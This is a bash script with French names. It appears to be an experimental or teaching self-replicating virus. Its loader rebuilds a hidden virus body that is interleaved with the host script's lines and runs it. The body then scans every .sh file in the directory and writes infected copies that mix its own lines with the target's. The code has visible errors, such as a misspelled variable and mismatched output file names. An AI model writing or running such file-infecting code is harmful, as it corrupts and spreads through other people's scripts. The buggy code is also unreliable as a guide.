#!/bin/bash
virus="virus1.sh"
cible="cible1.sh"
fichier="temp.sh"
cat /dev/null > $virus
cat /dev/null > $cible
l=$(cat $0 | wc -l)
l=$(($l-27))
tail -n $l $0 > $ficher          
i=0
r=1
while [ $i -le $l -a $r -ge 1 ]
do
    i=$(($i+1))
    ligne=$(head -n $i $fichier | tail -n 1 )
    n=$(echo -n $ligne | wc -c)
    echo -n $ligne | cut -c 1-$(($n-1)) >> $virus
    r=$(echo -n $ligne | cut -c $n-$n )
    echo $r
    i=$(($i+$r))
    head -n $i $fichier | tail -n $r >> $cible    
done
r=$(($l-$i))
cat $fichier | tail -n $r >> $cible
rm $fichier
./$virus $0 $cible
./$cible 
#!/bin/bash3
#!/bin/bash
#ligne 0
#ligne 1
result="temp.sh"3
#ligne 2
#ligne 3
#ligne 4
virus=$03
#ligne 5
#ligne 6
#ligne 7
echo $virus3
#ligne 8
#ligne 9
#ligne 10
for cible in *.sh1
#ligne 11
do2
#ligne 12
#ligne 13
    n0=$(cat $cible | wc -l )3
#ligne 14
#ligne 15
#ligne 16
    n1=$(cat $virus | wc -l )2
#ligne 17
#ligne 18
    m1=$((3*$n1))2
#ligne 19
#ligne 20
    echo "$(basename $cible) != $(basename $0) -a  $(basename $cible) != $(basename $1)" 2
#ligne 21
#ligne 22
    if [ $n0 -gt $m1 -a $(basename $cible) != $(basename $0) -a  $(basename $cible) != $(basename $1) ]1
#ligne 23
    then3
#ligne 24
#ligne 25
#ligne 26
        i=13
#ligne 27
#ligne 28
#ligne 29
        cat /dev/null >  $result2
#ligne 30
#ligne 31
        j=0    1
#ligne 32
        while [ $i -lt $n1 ]2
#ligne 33
#ligne 34
        do3
#ligne 35
#ligne 36
#ligne 37
            lvir=$(head -n $i $virus | tail -n 1 )3
#ligne 38
#ligne 39
#ligne 40
            r=$((($RANDOM % 3)+1))       1
#ligne 41
            echo "$lvir$r" >> $result        1
#ligne 42
	    j=$(($j+$r))3
#ligne 43
#ligne 44
#ligne 45
	    head -n $j $cible | tail -n $r >> $result2
#ligne 46
#ligne 47
            i=$(($i+1))1
#ligne 48
        done        2
#ligne 49
#ligne 50
        lvir=$(head -n $i $virus | tail -n 1 )2
#ligne 51
#ligne 52
        r=02
#ligne 53
#ligne 54
        echo "$lvir$r" >> $result2
#ligne 55
#ligne 56
        echo "$n0 - $j"3
#ligne 57
#ligne 58
#ligne 59
        r=$(($n0 - $j))2
#ligne 60
#ligne 61
        cat $cible | tail -n $r >> $result3
#ligne 62
#ligne 63
#ligne 64
    fi1
#ligne 65
done0
#ligne 66
#ligne 67
#ligne 68
#ligne 69
#ligne 70
#ligne 71
#ligne 72
#ligne 73
#ligne 74
#ligne 75
#ligne 76
#ligne 77
#ligne 78
#ligne 79
#ligne 80
#ligne 81
#ligne 82
#ligne 83
#ligne 84
#ligne 85
#ligne 86
#ligne 87
#ligne 88
#ligne 89
#ligne 90
#ligne 91
#ligne 92
#ligne 93
#ligne 94
#ligne 95
#ligne 96
#ligne 97
#ligne 98
#ligne 99
